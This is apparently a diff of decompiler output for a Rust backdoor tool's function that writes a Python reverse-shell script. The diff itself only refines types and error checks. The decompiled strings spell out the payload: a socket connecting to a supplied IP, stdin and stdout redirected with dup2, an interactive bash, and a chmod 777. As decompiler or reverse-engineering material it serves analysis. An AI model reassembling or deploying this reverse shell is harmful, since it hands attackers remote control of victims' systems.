@@ -19,11 +19,11 @@ fn backdoorautomater::cronshell::write_shell_pyfile(a0: &struct24, a1: &struct24
     let v17: struct24;  // [bp-0x130]
     let v18: &str;  // [bp-0x130]
     let v19: std::fs::File;  // [bp-0x12c]
-    let v20: core::fmt::Arguments;  // [bp-0x128]
+    let v20: u64;  // [bp-0x128]
     let v21: core::result::Result<std::process::Output, std::io::error::Error>;  // [bp-0x120], Other Possible Types: u128
     let v22: struct56;  // [bp-0x60]
     let v23: u64;  // [bp-0x40]
-    let v25: core::fmt::Arguments;  // r12
+    let v25: core::result::Result<core::net::ip_addr::Ipv4Addr, core::net::parser::AddrParseError>;  // r12
 
     v14 = std::fs::File::create(a2, a2);
     match v14 {
@@ -31,35 +31,35 @@ fn backdoorautomater::cronshell::write_shell_pyfile(a0: &struct24, a1: &struct24
         },
         Ok(v0) => {
             v25 = std::io::Write::write_all(&v0, "import socket,subprocess,os;\n");
-            if !v25 {
+            if let Ok(_) = v25 {
                 v25 = std::io::Write::write_all(&v0, "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n");
-                if !v25 {
+                if let Ok(_) = v25 {
                     v18 = "v_ip='";
                     v21 = *((a1 + 8) as &i128);
                     v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                     v1 = v8;
                     alloc::vec::Vec<T,A>::extend_from_slice(&v1, "';\n");
                     v25 = std::io::Write::write_all(&v0, v2, v3);
-                    if !v25 {
+                    if let Ok(_) = v25 {
                         v15 = "s.connect((v_ip,";
                         v21 = *((a0 + 8) as &i128);
                         v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
                         v4 = v8;
                         alloc::vec::Vec<T,A>::extend_from_slice(&v4, "));\n");
                         v25 = std::io::Write::write_all(&v0, v5, v6);
-                        if !v25 {
+                        if let Ok(_) = v25 {
                             v25 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),0);\n");
-                            if !v25 {
+                            if let Ok(_) = v25 {
                                 v25 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),1);\n");
-                                if !v25 {
+                                if let Ok(_) = v25 {
                                     v25 = std::io::Write::write_all(&v0, "os.dup2(s.fileno(),2);\n");
-                                    if !v25 {
+                                    if let Ok(_) = v25 {
                                         v25 = std::io::Write::write_all(&v0, "v_shell_path='/usr/bin/bash';\n");
-                                        if !v25 {
+                                        if let Ok(_) = v25 {
                                             v25 = std::io::Write::write_all(&v0, "v_shell_value='-i';\n");
-                                            if !v25 {
+                                            if let Ok(_) = v25 {
                                                 v25 = std::io::Write::write_all(&v0, "p=subprocess.call([v_shell_path,v_shell_value]);\n");
-                                                if !v25 {
+                                                if let Ok(_) = v25 {
                                                     v16 = "chmod 777 ";
                                                     v21 = *((a2 + 8) as &i128);
                                                     v7 = alloc::str::join_generic_copy(&v14, 2, 1, 0);
